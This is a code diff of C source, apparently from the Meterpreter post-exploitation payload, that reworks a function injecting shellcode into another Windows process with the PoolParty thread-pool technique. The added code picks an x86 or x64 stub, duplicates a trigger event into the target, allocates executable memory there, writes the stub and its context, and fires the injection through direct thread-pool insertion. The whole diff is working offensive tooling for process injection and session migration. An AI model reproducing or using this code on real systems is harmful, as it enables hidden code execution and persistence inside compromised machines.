@@ -523,20 +523,52 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 	ctx.s.lpStartAddress = lpStartAddress;
 	ctx.p.lpParameter = lpParameter;
 	HANDLE hTriggerEvent = INVALID_HANDLE_VALUE;
+	HANDLE hRemoteTriggerEvent = INVALID_HANDLE_VALUE;
+
+	LPVOID lpStub = NULL;
+	DWORD dwStubSize = 0;
+
+	DWORD dwPoolPartyVariant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION;
 	do
 	{
 		
 		if (dwDestinationArch == dwMeterpreterArch) {
-			lpPoolPartyStub = VirtualAllocEx(hProcess, NULL, sizeof(poolparty_stub_x64) + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-			if (!WriteProcessMemory(hProcess, lpPoolPartyStub, poolparty_stub_x64, sizeof(poolparty_stub_x64), NULL)) {
+			if (dwMeterpreterArch == PROCESS_ARCH_X64) {
+				lpStub = &poolparty_stub_x64;
+				dwStubSize = sizeof(poolparty_stub_x64) - 1;
+			}
+			else {
+				lpStub = &poolparty_stub_x86;
+				dwStubSize = sizeof(poolparty_stub_x86) - 1;
+			}
+
+			hTriggerEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+			if (!hTriggerEvent)
+			{
+				BREAK_ON_ERROR("[INJECT][inject_via_poolparty] CreateEvent failed");
+			}
+
+			// Duplicate the event handle for the target process
+			if (!DuplicateHandle(GetCurrentProcess(), hTriggerEvent, hProcess, &ctx.e.hTriggerEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
+			{
+				BREAK_ON_ERROR("[INJECT][inject_via_poolparty] DuplicateHandle failed");
+			}
+
+			lpPoolPartyStub = VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			//dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
+			if (!lpPoolPartyStub) {
+				BREAK_ON_ERROR("[INJECT] inject_via_poolparty: VirtualAllocEx failed!");
+			}
+			
+			if (!WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
 				BREAK_ON_ERROR("[INJECT] inject_via_poolparty: Cannot write custom shellcode!");
 			}
 
-			if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + sizeof(poolparty_stub_x64), &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
+			if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
 				BREAK_ON_ERROR("[INJECT] inject_via_poolparty: Cannot write custom shellcode!");
 			}
 
-			if (remote_tp_wait_insertion(hProcess, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + sizeof(poolparty_stub_x64), &hTriggerEvent) == ERROR_SUCCESS) {
+			if (remote_tp_direct_insertion(hProcess, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent) == ERROR_SUCCESS) {
 				dprintf("[INJECT] inject_via_poolparty: injectied!");
 			}
 			else {
@@ -547,24 +579,23 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 			BREAK_ON_ERROR("[INJECT] inject_via_poolparty: this technique doesn't work on wow64")
 		}
 
+		if (remote && response)
+		{
+			dprintf("[INJECT] inject_via_poolparty: Sending a migrate response...");
+			// Send a successful response to let the ruby side know that we've pretty
+			// much successfully migrated and have reached the point of no return
+			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
+			packet_transmit_response(ERROR_SUCCESS, remote, response);
+
+			dprintf("[INJECT] inject_via_poolparty: Sleeping for two seconds...");
+			// Sleep to give the remote side a chance to catch up...
+			Sleep(2000);
+
+		}
+		SetEvent(hTriggerEvent);
+		SetLastError(dwResult);
+
 	} while (0);
-
-	if (remote && response)
-	{
-		dprintf("[INJECT] inject_via_poolparty: Sending a migrate response...");
-		// Send a successful response to let the ruby side know that we've pretty
-		// much successfully migrated and have reached the point of no return
-		packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
-		packet_transmit_response(ERROR_SUCCESS, remote, response);
-
-		dprintf("[INJECT] inject_via_poolparty: Sleeping for two seconds...");
-		// Sleep to give the remote side a chance to catch up...
-		Sleep(2000);
-		
-	}
-	SetEvent(hTriggerEvent);
-	SetLastError(dwResult);
-
 	return dwResult;
 }
 
